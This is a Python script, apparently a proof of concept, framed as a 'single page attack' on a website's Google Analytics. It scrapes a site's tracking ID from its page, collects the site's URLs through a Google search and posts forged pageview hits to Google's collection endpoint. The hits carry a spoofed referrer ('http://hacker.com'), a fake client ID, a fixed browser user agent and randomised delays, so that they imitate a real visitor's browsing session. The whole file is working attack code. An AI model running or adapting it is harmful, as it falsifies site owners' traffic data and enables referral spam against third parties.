import sys
import requests
import re
import time
import random
import google
import threading

#https://developers.google.com/analytics/devguides/collection/protocol/v1/
#https://developers.google.com/analytics/devguides/collection/protocol/v1/geoid

def main():

    test = single_page_attack(target_url='http://zonksec.com',referral_url='http://hacker.com',client_id=402,bounces=10,page_delay_jitter=.50,page_delay=30)
    test.run()

class single_page_attack:
    def __init__(self, target_url, client_id, referral_url, bounce_urls = None, page_delay=30, page_delay_jitter=.10, bounces=0, loop=1):
        self.target_url = target_url
        self.client_id = client_id
        self.referral_url = referral_url
        self.page_delay = page_delay
        self.page_delay_jitter = page_delay_jitter
        self.bounces = bounces
        self.bounce_urls = bounce_urls
        self.loop=loop

        #if bounce urls are need, collects them.
        if self.bounces <= 10 and self.bounces != 0 and self.bounce_urls is None:
            self.bounce_urls = []
            search_results = google.search(query="site:"+self.target_url, num=10,stop=1)
            for result in search_results:
                self.bounce_urls.append(str(result))
        elif self.bounces > 10 and self.bounce_urls is None:
            self.bounce_urls = []
            search_results = google.search(query="site:"+self.target_url, num=self.bounces,stop=1)
            for result in search_results:
                self.bounce_urls.append(str(result))

    def run(self,client_id=None):
        if client_id is not None:
            self.client_id = client_id
        pages = []
        loop_count = 0
        last_page = self.referral_url
        while loop_count < self.loop:
            target_request = analytics_request(document_location=self.target_url,document_referrer=last_page,client_id=self.client_id)
            target_request.send()
            pages.append(self.target_url)
            bounce_count = 0
            last_page = self.target_url
            while (bounce_count < self.bounces):
                delay = self.page_delay - random.randint(0,(self.page_delay * self.page_delay_jitter))
                print(delay)
                time.sleep(delay)
                bounce_request = analytics_request(document_location=self.bounce_urls[random.randint(0,9)],document_referrer=last_page,client_id=self.client_id)
                bounce_request.send()
                pages.append(bounce_request.document_location)
                last_page = bounce_request.document_location
                bounce_count += 1
            loop_count += 1
        behavior = ''
        for page in pages:
            behavior = behavior + page + ' => '

        return behavior[:-4]



class analytics_request:
    def __init__(self,document_referrer,document_location,client_id,tracking_id=None,version=1,hit_type='pageview',user_agent ='Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',geo_id ='US', anon_ip =1):
        self.version = version
        self.tracking_id = tracking_id
        self.client_id = client_id
        self.hit_type = hit_type
        self.user_agent = user_agent
        self.geo_id = geo_id
        self.document_referrer = document_referrer
        self.document_location = document_location
        self.anon_ip = anon_ip

        if self.tracking_id is None:
            page = requests.get(document_location)
            m = re.search("'(UA-(.*))',", page.text)
            self.tracking_id = str(m.group(1))

    def send(self):
        params = {}
        params['v'] = self.version
        params['tid'] = self.tracking_id
        params['cid'] = self.client_id
        params['t'] = self.hit_type
        params['aip'] = self.anon_ip
        params['dl'] = self.document_location
        params['dr'] =self.document_referrer
        params['geoid'] = self.geo_id
        params['ua'] = self.user_agent

        r = requests.post('https://www.google-analytics.com/collect', data=params)
        print('request sent. param:')
        print(params)


main()